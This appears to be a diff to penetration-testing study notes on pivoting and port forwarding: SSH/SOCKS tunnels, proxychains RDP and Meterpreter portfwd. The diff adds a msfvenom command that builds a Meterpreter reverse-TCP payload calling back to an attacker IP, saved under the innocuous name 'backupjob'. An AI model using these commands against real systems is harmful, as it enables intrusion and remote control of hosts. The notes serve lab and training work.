@@ -1,6 +1,9 @@
 **Overview:**
 - Port forwarding redirects communication requests from one port to another, using TCP as the primary transport. SSH or SOCKS can be used to encapsulate forwarded traffic, effectively bypassing firewalls and leveraging existing services on a compromised host to pivot into other networks.
 - Local port forwarding allows accessing services on a remote host as if they were running locally, enabling exploitation of services that would otherwise be unreachable from the attack machine.
+- Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
+- Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.
+
 ---
 ## Local Port Forwarding
 
@@ -41,4 +44,12 @@ Launch Metasploit through the proxy to route all associated traffic through the 
 proxychains xfreerdp /v:<target> /u:<user> /p:<password>
 ```
 
-Connect to RDP through the pivot.```
+Connect to RDP through the pivot.
+
+Metasploit port forwarding
+
+use exploit/multi/handler
+
+ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+
+```
